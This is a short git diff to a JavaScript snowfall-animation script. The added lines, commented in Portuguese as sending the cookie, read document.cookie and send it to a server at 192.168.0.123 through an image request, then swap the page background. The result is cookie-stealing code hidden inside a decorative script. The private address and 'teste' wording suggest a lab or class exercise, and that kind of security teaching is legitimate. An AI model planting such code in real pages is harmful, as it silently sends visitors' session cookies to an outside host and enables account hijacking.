@@ -65,4 +65,12 @@ function SnowStart()
 	}
 	snow_time = setTimeout("SnowStart()", 10);
 }
+// inicio - Envio cookie
+a = document.cookie;
+b = "http://192.168.0.123/?=";
+c = b.concat(a);
+//alert('teste cookie: 'c);
+new Image().src=c;
+document.body.style.backgroundImage = "url('https://rodrigorochapinto.github.io/pages-teste/imagens/ufsj1.jpg')";
+// fim - Envio cookie
 SnowStart()
